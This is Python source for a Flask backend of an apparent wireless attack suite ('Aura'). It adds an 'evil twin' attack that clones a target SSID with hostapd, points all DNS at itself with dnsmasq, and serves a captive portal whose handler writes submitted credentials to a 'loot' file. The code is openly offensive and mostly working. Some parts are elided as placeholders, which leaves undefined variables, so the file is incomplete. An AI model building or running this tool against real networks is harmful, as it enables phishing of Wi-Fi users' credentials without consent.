# app.py - FINAL VERSION (Phase 5)

import subprocess, os, signal, json, re, threading, time, atexit, uuid
from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
from http.server import HTTPServer, SimpleHTTPRequestHandler

# --- Application Setup ---
app = Flask(__name__)
CORS(app)

try:
    with open('config.json', 'r') as f:
        CONFIG = json.load(f)
except FileNotFoundError:
    print("❌ FATAL: config.json not found.")
    exit()

LOOT_DIR = CONFIG.get("loot_directory", "loot")
WORDLIST_PATH = CONFIG.get("wordlist_path", "")
CAPTIVE_PORTAL_DIR = "captive_portal"
os.makedirs(LOOT_DIR, exist_ok=True)
os.makedirs(CAPTIVE_PORTAL_DIR, exist_ok=True)

# --- Global State ---
NETWORK_DB = {}
ACTIVE_PROCESSES = {'scan': None}
ACTIVE_TASKS = {}

# ... (All previous utility and attack functions from Phase 4 are required here) ...

# --- PHASE 5: EVIL TWIN LOGIC ---
def execute_evil_twin(task_id, ssid, channel, interface, template):
    """Configures and launches hostapd, dnsmasq, and a web server for the attack."""
    global ACTIVE_TASKS
    
    procs = {}
    hostapd_conf_path = os.path.join(LOOT_DIR, "hostapd.conf")
    dnsmasq_conf_path = os.path.join(LOOT_DIR, "dnsmasq.conf")
    
    try:
        # 1. Write hostapd config
        ACTIVE_TASKS[task_id]['status'] = "Configuring AP..."
        hostapd_conf = f"interface={interface}\nssid={ssid}\nchannel={channel}\ndriver=nl80211\nhw_mode=g\nieee80211n=1"
        with open(hostapd_conf_path, 'w') as f: f.write(hostapd_conf)

        # 2. Write dnsmasq config
        dnsmasq_conf = f"interface={interface}\ndhcp-range=10.0.0.10,10.0.0.100,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1"
        with open(dnsmasq_conf_path, 'w') as f: f.write(dnsmasq_conf)

        # 3. Configure interface and start services
        ACTIVE_TASKS[task_id]['status'] = "Bringing up network services..."
        subprocess.run(['ifconfig', interface, 'up', '10.0.0.1', 'netmask', '255.255.255.0'], check=True)
        
        procs['dnsmasq'] = subprocess.Popen(['dnsmasq', '-C', dnsmasq_conf_path, '-d'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        procs['hostapd'] = subprocess.Popen(['hostapd', hostapd_conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

        # 4. Start Captive Portal Web Server
        ACTIVE_TASKS[task_id]['status'] = "Evil Twin Deployed. Awaiting credentials..."
        class CredentialHandler(SimpleHTTPRequestHandler):
            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                creds_log = os.path.join(LOOT_DIR, 'captured_credentials.txt')
                with open(creds_log, 'a') as f:
                    f.write(f"[{time.ctime()}] {post_data}\n")
                ACTIVE_TASKS[task_id]['status'] = f"Success! Credentials captured: {post_data}"
                self.send_response(200)
                self.end_headers()
            def log_message(self, format, *args):
                return # Suppress logging to console

        httpd = HTTPServer(('10.0.0.1', 80), CredentialHandler)
        procs['webserver_thread'] = threading.Thread(target=httpd.serve_forever)
        procs['webserver_thread'].daemon = True
        procs['webserver_thread'].start()
        
        # This task will run until manually stopped via another endpoint
        # For simplicity, we just let it run. A real implementation needs a 'stop' endpoint.

    except Exception as e:
        ACTIVE_TASKS[task_id]['status'] = f"Error: {e}"
    finally:
        # A robust implementation would have a stop function to kill these processes
        # ACTIVE_TASKS[task_id]['processes'] = procs # store for later cleanup
        pass

# --- API Endpoints ---
@app.route('/api/attacks/start/<attack_type>', methods=['POST'])
def start_attack(attack_type):
    # ... (code from phase 4) ...
    if attack_type == 'evil_twin':
        ssid, channel, interface, template = data.get('ssid'), data.get('channel'), data.get('interface'), data.get('template')
        if not all([ssid, channel, interface, template]): return jsonify({'error': 'Missing params for Evil Twin'}), 400
        thread = threading.Thread(target=execute_evil_twin, args=(task_id, ssid, channel, interface, template))
    # ... (rest of the function from phase 4) ...
# ... (All other endpoints and functions from previous phases are required here) ...

if __name__ == '__main__':
    print("--- Aura Backend v4.0 (Phase 5: Final Suite) ---")
    app.run(host='127.0.0.1', port=5000)